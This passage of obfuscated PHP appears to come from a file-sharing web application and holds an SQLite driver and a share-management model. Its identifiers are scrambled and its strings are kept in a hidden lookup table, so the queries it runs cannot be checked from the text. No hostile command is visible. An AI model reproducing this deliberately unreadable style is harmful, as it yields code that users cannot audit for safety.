$this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆôÛßğ; if ($this->queryID) { $this->free(); } think_action_status($²Öò¨[25], 1); think_status($²Öò¨[24]); $Ûüú¥¹¬ = $this->_linkID->exec($ˆôÛßğ); $this->debug(); if (!1 === $Ûüú¥¹¬) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[´‹ô¯Œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¸Õ§›Ò£ = $this->_linkID->query($_SERVER[´‹ô¯Œ][27]); if (!$¸Õ§›Ò£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïÍÊ¹Ÿ– = $this->_linkID->query($_SERVER[´‹ô¯Œ][28]); if (!$ïÍÊ¹Ÿ–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ñ¿Äæß = array(); while ($…Ğ¸ÎÓ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ñ¿Äæß[] = $…Ğ¸ÎÓ; } $this->queryID->reset(); return $Ñ¿Äæß; } public function getFields($…¹ßâµš) { $ä¬ÄÀŠµ =& $_SERVER[´‹ô¯Œ]; $ ˆ˜Éş† = $this->query($ä¬ÄÀŠµ[29] . $…¹ßâµš . $ä¬ÄÀŠµ[30]); $õ¿¯íâ° = array(); if ($ ˆ˜Éş†) { foreach ($ ˆ˜Éş† as $ıîí‘ => $Şª³´˜Ã) { $õ¿¯íâ°[$Şª³´˜Ã[$ä¬ÄÀŠµ[32]]] = array($ä¬ÄÀŠµ[32] => $Şª³´˜Ã[$ä¬ÄÀŠµ[32]], $ä¬ÄÀŠµ[33] => $Şª³´˜Ã[$ä¬ÄÀŠµ[33]], $ä¬ÄÀŠµ[35] => (bool) ($Şª³´˜Ã[$ä¬ÄÀŠµ[35]] === $ä¬ÄÀŠµ[12]), $ä¬ÄÀŠµ[37] => $Şª³´˜Ã[$ä¬ÄÀŠµ[56]], $ä¬ÄÀŠµ[39] => (bool) $Şª³´˜Ã[$ä¬ÄÀŠµ[57]], $ä¬ÄÀŠµ[42] => (bool) $Şª³´˜Ã[$ä¬ÄÀŠµ[57]]); } } return $õ¿¯íâ°; } public function getTables($Ú†é‹Ø‹ = '') { $³í…¹é» =& $_SERVER[´‹ô¯Œ]; $óóêÑ¸­ = $this->query($³í…¹é»[45] . $³í…¹é»[46] . $³í…¹é»[47]); $ÄÎŠ§Áä = array(); foreach ($óóêÑ¸­ as $ÎÅüœôë => $›û¼Æëö) { $ÄÎŠ§Áä[$ÎÅüœôë] = current($›û¼Æëö); } return $ÄÎŠ§Áä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $íñÃº°š =& $_SERVER[´‹ô¯Œ]; $this->error = $this->_linkID->lastErrorMsg(); if ($íñÃº°š[12] != $this->queryStr) { $this->error .= LNG($íñÃº°š[48]) . $this->queryStr; } think_trace($this->error, $íñÃº°š[12], $íñÃº°š[49]); return $this->error; } public function escapeString($Š¯ëŒÂô) { $–ÌÉé€ =& $_SERVER[´‹ô¯Œ]; if ($this->_linkID) { return $this->_linkID->escapeString($Š¯ëŒÂô); } return str_ireplace($–ÌÉé€[58], $–ÌÉé€[59], $Š¯ëŒÂô); } public function parseLimit($ö€ä¦‚) { $Û‰ı³²‘ =& $_SERVER[´‹ô¯Œ]; $ùúøÃÄæ = $Û‰ı³²‘[12]; if (!empty($ö€ä¦‚)) { $ö€ä¦‚ = explode($Û‰ı³²‘[50], $ö€ä¦‚); if (count($ö€ä¦‚) > 1) { $ùúøÃÄæ .= $Û‰ı³²‘[51] . $ö€ä¦‚[1] . $Û‰ı³²‘[52] . $ö€ä¦‚[0] . $Û‰ı³²‘[53]; } else { $ùúøÃÄæ .= $Û‰ı³²‘[51] . $ö€ä¦‚[0] . $Û‰ı³²‘[53]; } } return $ùúøÃÄæ; } } goto bœê’óßÏ–; B™×¢¨††: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\x69\155\145", "\164\x69\155\145", "\151\156\x73\145\162\x74\x2c\165\160\144\141\x74\x65", "\146\165\x6e\x63\164\x69\157\156"), array("\143\162\x65\x61\164\145\x54\151\155\145", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\146\x75\156\x63\164\151\157\x6e"), array("\x6f\160\x74\x69\157\x6e\163", '', "\x69\x6e\163\x65\162\164\x2c\165\160\x64\x61\x74\145\x2c\x73\x65\154\x65\x63\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($«®õÔ—) { $´¬‡Ğ–ş =& $_SERVER[´‹ô¯Œ]; $¥¨¿ŸŠ = isset($«®õÔ—[0]) ? $«®õÔ—[0] : !1; $÷â¦¿°÷ = $´¬‡Ğ–ş[2139] . USER_ID; return array($´¬‡Ğ–ş[2140] => array(USER_ID, $´¬‡Ğ–ş[2141]), $´¬‡Ğ–ş[2080] => array($¥¨¿ŸŠ, $´¬‡Ğ–ş[2142], $÷â¦¿°÷)); } protected function listSimple() { $ÅÈ™ÆıŸ = array($_SERVER[´‹ô¯Œ][1796] => USER_ID); $ş£²›¾Í = $this->field($this->fieldList)->where($ÅÈ™ÆıŸ)->select(); return $ş£²›¾Í ? $ş£²›¾Í : array(); } protected function getInfo($İÍÜ£ƒª, $¤ã¶¥¢á = false, $”×†  = '') { $ÑÂñÇû¬ =& $_SERVER[´‹ô¯Œ]; if (!$”×† ) { $”×†  = $ÑÂñÇû¬[2139] . USER_ID; } if ($¤ã¶¥¢á) { return $this->_getShareInfo(array($ÑÂñÇû¬[682] => $İÍÜ£ƒª)); } $…œ…ãá° = $this->cacheFunctionGet($ÑÂñÇû¬[2082], $İÍÜ£ƒª, $”×† ); $£Ó…Ó…Ÿ = $this->shareInfoMofify($…œ…ãá°, $ÑÂñÇû¬[226]); if (isset($…œ…ãá°[$ÑÂñÇû¬[88]]) && $£Ó…Ó…Ÿ != $…œ…ãá°[$ÑÂñÇû¬[88]]) { $óîÄ‡´ƒ = $this->cacheKeyMake($ÑÂñÇû¬[2082], $İÍÜ£ƒª, $”×† ); $…œ…ãá° = $this->_getShareInfo(array($ÑÂñÇû¬[682] => $İÍÜ£ƒª)); Cache::set($óîÄ‡´ƒ, $…œ…ãá°); } return $…œ…ãá°; } private function shareInfoMofify(&$Ò¯Óà¿÷, $®«èê²‡ = "\x67\x65\x74") { $²ñ·íİô =& $_SERVER[´‹ô¯Œ]; if (!$Ò¯Óà¿÷ || !isset($Ò¯Óà¿÷[$²ñ·íİô[682]])) { return; } $«Ãäø­á = $²ñ·íİô[2143] . $Ò¯Óà¿÷[$²ñ·íİô[682]]; if ($®«èê²‡ == $²ñ·íİô[226]) { return Cache::get($«Ãäø­á); } else { if ($®«èê²‡ == $²ñ·íİô[2111]) { $½«¢¢™¶ = Cache::get($«Ãäø­á); if ($½«¢¢™¶ === $Ò¯Óà¿÷[$²ñ·íİô[88]]) { return; } $Ò¯Óà¿÷[$²ñ·íİô[2144]] = USER_ID . $²ñ·íİô[465] . $Ò¯Óà¿÷[$²ñ·íİô[88]]; Cache::set($«Ãäø­á, $Ò¯Óà¿÷[$²ñ·íİô[88]]); } else { if ($®«èê²‡ == $²ñ·íİô[2145]) { Cache::remove($«Ãäø­á); } } } } public function getInfoByHash($ÚéÚ¯Šˆ) { return $this->_getShareInfo(array($_SERVER[´‹ô¯Œ][2146] => $ÚéÚ¯Šˆ)); } public function getInfoByPath($Òè£ÔŸÚ) { $©ùãµÙÁ =& $_SERVER[´‹ô¯Œ]; $«Ø€…€ = array($©ùãµÙÁ[1796] => USER_ID, $©ùãµÙÁ[194] => $Òè£ÔŸÚ); return $this->_getShareInfo($«Ø€…€); } public function getInfoBySourcePath($‹Ö¿¨çß) { $€¬Úßø’ =& $_SERVER[´‹ô¯Œ]; $è“‹ìÁ¿ = array($€¬Úßø’[1796] => USER_ID, $€¬Úßø’[1274] => $‹Ö¿¨çß); return $this->_getShareInfo($è“‹ìÁ¿); } private function _getShareInfo($Í†¿‰îí) { $Ùéüõ¤à =& $_SERVER[´‹ô¯Œ]; $ Ì«‰ìŞ = $this->where($Í†¿‰îí)->find(); if (!$ Ì«‰ìŞ) { return !1; } $Í†¿‰îí = array($Ùéüõ¤à[682] => $ Ì«‰ìŞ[$Ùéüõ¤à[682]]); $¦®ï¥ÒÅ = $Ùéüõ¤à[2147]; $á£Éì±¿ = Model($Ùéüõ¤à[683])->order($Ùéüõ¤à[487])->field($¦®ï¥ÒÅ)->where($Í†¿‰îí)->select(); if ($ Ì«‰ìŞ[$Ùéüõ¤à[194]] == $Ùéüõ¤à[231]) { $ Ì«‰ìŞ[$Ùéüõ¤à[90]] = IO::info($ Ì«‰ìŞ[$Ùéüõ¤à[1274]]); } else { $ Ì«‰ìŞ[$Ùéüõ¤à[90]] = Model($Ùéüõ¤à[1445])->pathInfo($ Ì«‰ìŞ[$Ùéüõ¤à[194]]); } $ Ì«‰ìŞ[$Ùéüõ¤à[2148]] = $á£Éì±¿; $this->shareInfoMofify($ Ì«‰ìŞ, $Ùéüõ¤à[2111]); return $ Ì«‰ìŞ; } protected function getInfoAuth($Ú¸ÖºÏß) { $œËÂÅÉÂ =& $_SERVER[´‹ô¯Œ]; $úš‚ï“Ü = $this->getInfo($Ú¸ÖºÏß); if ($úš‚ï“Ü[$œËÂÅÉÂ[1796]] == USER_ID) { $úš‚ï“Ü[$œËÂÅÉÂ[499]] = $úš‚ï“Ü[$œËÂÅÉÂ[90]][$œËÂÅÉÂ[499]]; } else { $úš‚ï“Ü[$œËÂÅÉÂ[499]] = Model($œËÂÅÉÂ[581])->authMake($úš‚ï“Ü[$œËÂÅÉÂ[2148]]); } return $úš‚ï“Ü; } protected function listData($¯Ì¹®³Î = null, $¦æºÖåÀ = 300) { $«¢½¨½‹ =& $_SERVER[´‹ô¯Œ]; $¦«Û«ò = array(array($«¢½¨½‹[576] => array($«¢½¨½‹[1104], 0), $«¢½¨½‹[680] => array($«¢½¨½‹[1104], 0), $«¢½¨½‹[2149] => $«¢½¨½‹[2099])); if ($¯Ì¹®³Î == $«¢½¨½‹[2150]) { $¦«Û«ò = array($«¢½¨½‹[576] => 1); } else { if ($¯Ì¹®³Î == $«¢½¨½‹[1257]) { $¦«Û«ò = array($«¢½¨½‹[680] => 1); } } $¦«Û«ò[$«¢½¨½‹[1796]] = USER_ID; $ˆáÒ­é­ = $this->where($¦«Û«ò)->selectPage($¦æºÖåÀ); return $ˆáÒ­é­; } protected function listToMe($ñˆ„”‰… = 300) { $îµ™¬ë =& $_SERVER[´‹ô¯Œ]; $àÌäˆ‚î = Model($îµ™¬ë[2151])->userGroupParents(USER_ID); $¼Úù‚³Œ = array($îµ™¬ë[665] => SourceModel::TYPE_USER, $îµ™¬ë[583] => USER_ID); if ($àÌäˆ‚î) { $¼Úù‚³Œ = array(array($îµ™¬ë[665] => SourceModel::TYPE_USER, $îµ™¬ë[583] => USER_ID), array($îµ™¬ë[665] => SourceModel::TYPE_GROUP, $îµ™¬ë[583] => array($îµ™¬ë[7], $àÌäˆ‚î)), $îµ™¬ë[2149] => $îµ™¬ë[2099]); } $¼ˆ¬ĞÜÙ = Model($îµ™¬ë[683])->where($¼Úù‚³Œ)->selectPage($ñˆ„”‰…); $Í—ïòñ = array_to_keyvalue_group($¼ˆ¬ĞÜÙ[$îµ™¬ë[448]], $îµ™¬ë[682]); if (!$Í—ïòñ) { return $¼ˆ¬ĞÜÙ; } $ç€ûÄğ¶ = $îµ™¬ë[2152]; $¼Úù‚³Œ = array($îµ™¬ë[682] => array($îµ™¬ë[504], array_keys($Í—ïòñ)), $îµ™¬ë[1796] => array($îµ™¬ë[1106], $îµ™¬ë[231])); $‹Ä« = $this->field($ç€ûÄğ¶)->where($¼Úù‚³Œ)->select(); foreach ($‹Ä« as $«®òÄß => &$¹û£”Ø) { $¹û£”Ø[$îµ™¬ë[2148]] = $Í—ïòñ[$¹û£”Ø[$îµ™¬ë[682]]]; } unset($¹û£”Ø); $­åØ‘£Í = array($îµ™¬ë[2153] => $‹Ä«, $îµ™¬ë[2154] => $¼ˆ¬ĞÜÙ[$îµ™¬ë[445]]); return $­åØ‘£Í; } protected function shareAdd($×¸¹“í±, $Š­ôÍ‹ß) { $Íµ†è =& $_SERVER[´‹ô¯Œ]; $„Î¼¹» = $this->_addShareData($×¸¹“í±, $Š­ôÍ‹ß); if (!empty($Š­ôÍ‹ß[$Íµ†è[2155]])) { $this->_shareAuthSet($„Î¼¹», $Š­ôÍ‹ß[$Íµ†è[2155]]); } $this->shareEventAdd($×¸¹“í±, $Š­ôÍ‹ß, $Íµ†è[2156]); return $„Î¼¹»; } protected function shareAddSystem($İêş‘Äâ, $¡®ó‹Ã) { $’ƒ‚âßº =& $_SERVER[´‹ô¯Œ]; $Êˆñ¢´Í = $this->_addShareData($İêş‘Äâ, $¡®ó‹Ã, $’ƒ‚âßº[192]); $this->_shareAuthSet($Êˆñ¢´Í, $¡®ó‹Ã[$’ƒ‚âßº[2155]]); return $Êˆñ¢´Í; } private function shareEventAdd($÷ªÏÙµ†, $ééş‡¶, $½¯¾ Ûİ = "\x61\x64\x64") { $ï¨çÁ¯° =& $_SERVER[´‹ô¯Œ]; if (!$÷ªÏÙµ† || $÷ªÏÙµ† == $ï¨çÁ¯°[231]) { return; } if ($½¯¾ Ûİ == $ï¨çÁ¯°[2156]) { if ($ééş‡¶[$ï¨çÁ¯°[576]] == $ï¨çÁ¯°[91]) { Model($ï¨çÁ¯°[650])->eventShare($÷ªÏÙµ†, $ï¨çÁ¯°[2157]); } if ($ééş‡¶[$ï¨çÁ¯°[680]] == $ï¨çÁ¯°[91]) { Model($ï¨çÁ¯°[650])->eventShare($÷ªÏÙµ†, $ï¨çÁ¯°[2158]); } return; } $©«ğ®Íâ = $this->getInfoByPath($÷ªÏÙµ†); $¿âëØÙ‰ = $ï¨çÁ¯°[2159]; if ($©«ğ®Íâ[$ï¨çÁ¯°[576]] == $ï¨çÁ¯°[231] && $ééş‡¶[$ï¨çÁ¯°[576]] == $ï¨çÁ¯°[91]) { $¿âëØÙ‰ = $ï¨çÁ¯°[2157]; } if ($©«ğ®Íâ[$ï¨çÁ¯°[576]] == $ï¨çÁ¯°[91] && $ééş‡¶[$ï¨çÁ¯°[576]] == $ï¨çÁ¯°[231]) { $¿âëØÙ‰ = $ï¨çÁ¯°[2160]; } if ($©«ğ®Íâ[$ï¨çÁ¯°[680]] == $ï¨çÁ¯°[231] && $ééş‡¶[$ï¨çÁ¯°[680]] == $ï¨çÁ¯°[91]) { $¿âëØÙ‰ = $ï¨çÁ¯°[2158]; } if ($©«ğ®Íâ[$ï¨çÁ¯°[680]] == $ï¨çÁ¯°[91] && $ééş‡¶[$ï¨çÁ¯°[680]] == $ï¨çÁ¯°[231]) { $¿âëØÙ‰ = $ï¨çÁ¯°[2161]; } Model($ï¨çÁ¯°[650])->eventShare($÷ªÏÙµ†, $¿âëØÙ‰); return; } private function _addShareData($ÙšÌşÑé, $Ö¾Áä© = array(), $±”–¿³ = false) { $©¾Ù¥ÙÄ =& $_SERVER[´‹ô¯Œ]; $…¶©¦ò× = $±”–¿³ == $©¾Ù¥ÙÄ[192] ? 0 : USER_ID; $ã¥‰ï²Œ = array($©¾Ù¥ÙÄ[503] => $ÙšÌşÑé, $©¾Ù¥ÙÄ[1787] => $…¶©¦ò×); if ($ÙšÌşÑé == 0) { $ã¥‰ï²Œ = array($©¾Ù¥ÙÄ[2162] => $Ö¾Áä©[$©¾Ù¥ÙÄ[1274]], $©¾Ù¥ÙÄ[1787] => $…¶©¦ò×); } if ($áœÜÔ³ã = $this->where($ã¥‰ï²Œ)->find()) { return $áœÜÔ³ã[$©¾Ù¥ÙÄ[682]]; } if ($ÙšÌşÑé == 0) { $†ÛÕ•‰€ = array($©¾Ù¥ÙÄ[32] => get_path_this($Ö¾Áä©[$©¾Ù¥ÙÄ[87]])); } else { $†ÛÕ•‰€ = Model($©¾Ù¥ÙÄ[916])->sourceInfo($ÙšÌşÑé); if (!$†ÛÕ•‰€) { return !1; } } if (!$Ö¾Áä©[$©¾Ù¥ÙÄ[1684]]) { $Ö¾Áä©[$©¾Ù¥ÙÄ[1684]] = $†ÛÕ•‰€[$©¾Ù¥ÙÄ[32]]; } $©ç­“œÁ = array($©¾Ù¥ÙÄ[1787] => $…¶©¦ò×, $©¾Ù¥ÙÄ[503] => $ÙšÌşÑé, $©¾Ù¥ÙÄ[1684] => $©¾Ù¥ÙÄ[12], $©¾Ù¥ÙÄ[576] => 0, $©¾Ù¥ÙÄ[680] => 0, $©¾Ù¥ÙÄ[1274] => $©¾Ù¥ÙÄ[12], $©¾Ù¥ÙÄ[385] => $©¾Ù¥ÙÄ[12], $©¾Ù¥ÙÄ[981] => $©¾Ù¥ÙÄ[12], $©¾Ù¥ÙÄ[2163] => 0, $©¾Ù¥ÙÄ[2164] => 0, $©¾Ù¥ÙÄ[847] => 0, $©¾Ù¥ÙÄ[2165] => $©¾Ù¥ÙÄ[12], $©¾Ù¥ÙÄ[2146] => $©¾Ù¥ÙÄ[12]); $”¸ã¦ë² = explode($©¾Ù¥ÙÄ[50], $©¾Ù¥ÙÄ[2166]); foreach ($”¸ã¦ë² as $êôâÛ—í) { if (!isset($Ö¾Áä©[$êôâÛ—í])) { continue; } $©ç­“œÁ[$êôâÛ—í] = $Ö¾Áä©[$êôâÛ—í]; } $äı†ÉŒ­ = $this->add($©ç­“œÁ); $ª±ÆØÆ¥ = array($©¾Ù¥ÙÄ[2146] => short_id($äı†ÉŒ­)); $this->where(array($©¾Ù¥ÙÄ[2167] => $äı†ÉŒ­))->save($ª±ÆØÆ¥); return $äı†ÉŒ­; } private function _shareAuthSet($°Éˆş½, $äúòûŠ) { $»©«Õ® =& $_SERVER[´‹ô¯Œ]; if (!is_array($äúòûŠ)) { return !1; } $´”»šó‹ = Model($»©«Õ®[2109]); $´”»šó‹->where(array($»©«Õ®[682] => $°Éˆş½))->delete(); $Ã¼›Á¹€ = array(); foreach ($äúòûŠ as $–¥ú÷¿õ) { $ï ù££İ = SourceModel::TYPE_USER; if ($–¥ú÷¿õ[$»©«Õ®[191]] == SourceModel::TYPE_GROUP) { $ï ù££İ = SourceModel::TYPE_GROUP; } $““¶º = array($»©«Õ®[682] => $°Éˆş½, $»©«Õ®[191] => $ï ù££İ, $»©«Õ®[583] => intval($–¥ú÷¿õ[$»©«Õ®[583]]), $»©«Õ®[2105] => 0, $»©«Õ®[2168] => -1); if ($–¥ú÷¿õ[$»©«Õ®[2105]]) { $““¶º[$»©«Õ®[2105]] = $–¥ú÷¿õ[$»©«Õ®[2105]]; } else { if ($–¥ú÷¿õ[$»©«Õ®[2168]]) { $““¶º[$»©«Õ®[2168]] = $–¥ú÷¿õ[$»©«Õ®[2168]]; } } $Ã¼›Á¹€[] = $““¶º; } return $´”»šó‹->addAll($Ã¼›Á¹€, array(), !0); } public function numViewAdd($ÂÌ˜‘ïƒ) { $¶éû“œ =& $_SERVER[´‹ô¯Œ]; $Ë€Áş = array($¶éû“œ[2167] => $ÂÌ˜‘ïƒ); $this->where($Ë€Áş)->setAdd($¶éû“œ[2163]); } public function numDownloadAdd($®ö•İÚÜ) { $•ÜÇğ£ã =& $_SERVER[´‹ô¯Œ]; $îıšèÎê = array($•ÜÇğ£ã[2167] => $®ö•İÚÜ); $this->where($îıšèÎê)->setAdd($•ÜÇğ£ã[2164]); } protected function shareEdit($ÎÊ˜»®Ÿ, $ÈšÔ’µš) { $ÒáºÀ¡ç =& $_SERVER[´‹ô¯Œ]; $Ñ¯ÆÃ = $this->getInfo($ÎÊ˜»®Ÿ); if (!$Ñ¯ÆÃ) { return !1; } $this->_checkLinkShare($ÈšÔ’µš, $Ñ¯ÆÃ); $¯ÖÏÙÁ¹ = array(); $¬Üâò–” = explode($ÒáºÀ¡ç[50], $ÒáºÀ¡ç[2169]); foreach ($¬Üâò–” as $³ãÖşÎâ) { if (!array_key_exists($³ãÖşÎâ, $ÈšÔ’µš)) { continue; } $¯ÖÏÙÁ¹[$³ãÖşÎâ] = $ÈšÔ’µš[$³ãÖşÎâ]; } $this->shareEventAdd($Ñ¯ÆÃ[$ÒáºÀ¡ç[194]], $ÈšÔ’µš, $ÒáºÀ¡ç[1966]); $this->where(array($ÒáºÀ¡ç[2167] => $ÎÊ˜»®Ÿ))->save($¯ÖÏÙÁ¹); if (isset($ÈšÔ’µš[$ÒáºÀ¡ç[2155]])) { $this->_shareAuthSet($ÎÊ˜»®Ÿ, $ÈšÔ’µš[$ÒáºÀ¡ç[2155]]); } return !0; } private function _checkLinkShare($ïşàÌ‹¿, $²­á’æÍ) { $šÊøë‘ =& $_SERVER[´‹ô¯Œ]; if ($ïşàÌ‹¿[$šÊøë‘[576]] != $šÊøë‘[91]) { return; } $ÔïÇş³ = $²­á’æÍ[$šÊøë‘[90]][$šÊøë‘[194]]; if ($²­á’æÍ[$šÊøë‘[90]][$šÊøë‘[33]] != $šÊøë‘[233]) { $ÚŒ«™Ø» = $this->_folderReport($ÔïÇş³); if (!$ÚŒ«™Ø») { return; } show_json(LNG($šÊøë‘[2170]) . $šÊøë‘[2171] . $ÚŒ«™Ø», !1); } $Ê‚’Ú¡¯ = Model($šÊøë‘[916])->fileInfoGet($²­á’æÍ[$šÊøë‘[90]][$šÊøë‘[194]]); if (!$Ê‚’Ú¡¯) { return; } $ĞìÖÖ§» = $this->shareFileMeta($Ê‚’Ú¡¯[$šÊøë‘[555]]); if (isset($ĞìÖÖ§»[$šÊøë‘[453]]) && $ĞìÖÖ§»[$šÊøë‘[453]] == $šÊøë‘[91]) { show_json(LNG($šÊøë‘[2172]), !1); } } private function _folderReport($ö­É‚) { $Úç‘œÉú =& $_SERVER[´‹ô¯Œ]; $¯ü‘ÆÒ = array($Úç‘œÉú[555] => array($Úç‘œÉú[1104], 0), $Úç‘œÉú[836] => 3); $æîìçØ¸ = Model($Úç‘œÉú[2173])->where($¯ü‘ÆÒ)->field($Úç‘œÉú[555])->select(); if (!$æîìçØ¸) { return !1; } $æîìçØ¸ = array_to_keyvalue($æîìçØ¸, $Úç‘œÉú[12], $Úç‘œÉú[555]); $ğşïÅ©Ì = $Úç‘œÉú[50] . $ö­É‚ . $Úç‘œÉú[50]; $¯ü‘ÆÒ = array($Úç‘œÉú[555] => array($Úç‘œÉú[7], $æîìçØ¸), $Úç‘œÉú[598] => array($Úç‘œÉú[462], "\45{$ğşïÅ©Ì}\x25"), $Úç‘œÉú[517] => 0); $´ŠÎ‚ªŞ = Model($Úç‘œÉú[916])->where($¯ü‘ÆÒ)->field($Úç‘œÉú[2174])->find(); if (!$´ŠÎ‚ªŞ) { return !1; } $ğİÕŠù– = substr($´ŠÎ‚ªŞ[$Úç‘œÉú[598]], strpos($´ŠÎ‚ªŞ[$Úç‘œÉú[598]], $ğşïÅ©Ì)); $¯ü‘ÆÒ = array($Úç‘œÉú[194] => array($Úç‘œÉú[7], trim($ğİÕŠù–, $Úç‘œÉú[50]))); $Ñ¦†ùí = Model($Úç‘œÉú[916])->where($¯ü‘ÆÒ)->field($Úç‘œÉú[32])->select(); $Ò×À²½™ = array_to_keyvalue($Ñ¦†ùí, $Úç‘œÉú[12], $Úç‘œÉú[32]); $Ò×À²½™[] = $´ŠÎ‚ªŞ[$Úç‘œÉú[32]]; return implode($Úç‘œÉú[8], $Ò×À²½™); } protected function remove($ß‡Û”¯) { $‰‰äĞó =& $_SERVER[´‹ô¯Œ]; $š´º÷”“ = is_array($ß‡Û”¯) ? $ß‡Û”¯ : array($ß‡Û”¯); for ($±òª®Ùµ = 0; $±òª®Ùµ < count($š´º÷”“); $±òª®Ùµ++) { $ŸÕü¨À¥ = $this->getInfo($š´º÷”“[$±òª®Ùµ]); if ($ŸÕü¨À¥[$‰‰äĞó[680]] == $‰‰äĞó[91]) { Model($‰‰äĞó[650])->eventShare($ŸÕü¨À¥[$‰‰äĞó[194]], $‰‰äĞó[2161]); } if ($ŸÕü¨À¥[$‰‰äĞó[576]] == $‰‰äĞó[91]) { Model($‰‰äĞó[650])->eventShare($ŸÕü¨À¥[$‰‰äĞó[194]], $‰‰äĞó[2160]); } $this->shareInfoMofify($ŸÕü¨À¥, $‰‰äĞó[2145]); } $‹£·šüÆ = array($‰‰äĞó[682] => array($‰‰äĞó[7], $š´º÷”“)); $Ú½£º·õ = $this->where($‹£·šüÆ)->delete(); if ($Ú½£º·õ) { Model($‰‰äĞó[683])->where($‹£·šüÆ)->delete(); } return $Ú½£º·õ; } protected function removeBySource($Ã‘à¦¼Ÿ) { $ò²Äãï =& $_SERVER[´‹ô¯Œ]; $¥ô·¡ò¸ = array($ò²Äãï[503] => array($ò²Äãï[504], $Ã‘à¦¼Ÿ)); $¦»ï¬ıµ = $this->field($ò²Äãï[682])->where($¥ô·¡ò¸)->select(); $‰¶¸ì’í = array_to_keyvalue($¦»ï¬ıµ, $ò²Äãï[12], $ò²Äãï[682]); if (!$‰¶¸ì’í) { return; } foreach ($¦»ï¬ıµ as $äîÂ ö¼) { $this->shareInfoMofify($äîÂ ö¼, $ò²Äãï[2145]); } $¥ô·¡ò¸ = array($ò²Äãï[2167] => array($ò²Äãï[504], $‰¶¸ì’í)); $this->where($¥ô·¡ò¸)->delete(); Model($ò²Äãï[683])->where($¥ô·¡ò¸)->delete(); } public function listAll($íûš·è¼) { $ı¸åû×º =& $_SERVER[´‹ô¯Œ]; $ÜÌ«‹ˆÈ = array(); if ($íûš·è¼[$ı¸åû×º[1796]]) { $ÜÌ«‹ˆÈ[$ı¸åû×º[1796]] = $íûš·è¼[$ı¸åû×º[1796]]; } if ($íûš·è¼[$ı¸åû×º[846]]) { $á“€Àºá = $íûš·è¼[$ı¸åû×º[847]] ? $íûš·è¼[$ı¸åû×º[847]] : strtotime(date($ı¸åû×º[2175])); $ÜÌ«‹ˆÈ[$ı¸åû×º[234]] = array($ı¸åû×º[411], array($íûš·è¼[$ı¸åû×º[846]], $á“€Àºá)); } if ($íûš·è¼[$ı¸åû×º[33]]) { $ÜÌ«‹ˆÈ[$íûš·è¼[$ı¸åû×º[33]]] = 1; } else { $ÜÌ«‹ˆÈ[] = array($ı¸åû×º[576] => array($ı¸åû×º[1104], 0), $ı¸åû×º[680] => array($ı¸åû×º[1104], 0), $ı¸åû×º[2149] => $ı¸åû×º[2099]); } if ($íûš·è¼[$ı¸åû×º[2095]]) { $ÜÌ«‹ˆÈ[] = array($ı¸åû×º[2146] => $íûš·è¼[$ı¸åû×º[2095]], $ı¸åû×º[1684] => array($ı¸åû×º[462], "\45{$íûš·è¼[$ı¸åû×º[2095]]}\x25"), $ı¸åû×º[2149] => $ı¸åû×º[2099]); } $õ´Àû½º = $this->_makeOrder()->where($ÜÌ«‹ˆÈ)->selectPage(20); if (empty($õ´Àû½º[$ı¸åû×º[448]])) { return array(); } $this->_listDataApply($õ´Àû½º[$ı¸åû×º[448]]); return $õ´Àû½º; } public function listDataApply($“şâ¢») { $this->_listDataApply($“şâ¢»); return $“şâ¢»; } private function _listDataApply(&$¦€üØİ) { $ûÂ¡Ú =& $_SERVER[´‹ô¯Œ]; $†ÈÜ–ä = array_to_keyvalue($¦€üØİ, $ûÂ¡Ú[12], $ûÂ¡Ú[1796]); $‘©äò¿ = Model($ûÂ¡Ú[611])->userListInfo(array_unique($†ÈÜ–ä)); $áİ³•õÍ = array_to_keyvalue($¦€üØİ, $ûÂ¡Ú[12], $ûÂ¡Ú[194]); $™•ÆÕ×© = Model($ûÂ¡Ú[916])->sourceListInfo($áİ³•õÍ, !0); foreach ($¦€üØİ as $„ÛÚ·Â‡ => &$¯™«œĞ) { $¥³æß¹ = $¯™«œĞ[$ûÂ¡Ú[1796]]; $¯™«œĞ[$ûÂ¡Ú[2176]] = $‘©äò¿[$¥³æß¹] ? $‘©äò¿[$¥³æß¹] : !1; if (!$¯™«œĞ[$ûÂ¡Ú[2176]] || $¯™«œĞ[$ûÂ¡Ú[2176]][$ûÂ¡Ú[836]] != $ûÂ¡Ú[91]) { unset($¦€üØİ[$„ÛÚ·Â‡]); continue; } $»²ëªÛæ = $¯™«œĞ[$ûÂ¡Ú[194]]; $¯™«œĞ[$ûÂ¡Ú[90]] = $™•ÆÕ×©[$»²ëªÛæ] ? $™•ÆÕ×©[$»²ëªÛæ] : !1; if ($¯™«œĞ[$ûÂ¡Ú[90]][$ûÂ¡Ú[517]] == $ûÂ¡Ú[91]) { unset($¦€üØİ[$„ÛÚ·Â‡]); } if ($¯™«œĞ[$ûÂ¡Ú[90]] != $ûÂ¡Ú[231] && !$¯™«œĞ[$ûÂ¡Ú[90]]) { unset($¦€üØİ[$„ÛÚ·Â‡]); } } unset($¯™«œĞ); $¦€üØİ = array_values($¦€üØİ); } private function _makeOrder($âÄ–Â½ = '') { $í‡¢§šº =& $_SERVER[´‹ô¯Œ]; $Ç˜À„­Á = array($í‡¢§šº[234], $í‡¢§šº[847], $í‡¢§šº[2163], $í‡¢§šº[2164]); $ˆŒ²ªÃò = array($í‡¢§šº[535] => $í‡¢§šº[536], $í‡¢§šº[537] => $í‡¢§šº[538]); $Üœì£­ = Input::get($í‡¢§šº[542], $í‡¢§šº[7], $í‡¢§šº[509], $Ç˜À„­Á); $£ÈöîÅÏ = Input::get($í‡¢§šº[543], $í‡¢§šº[7], $í‡¢§šº[2177], array($í‡¢§šº[2092], $í‡¢§šº[537])); 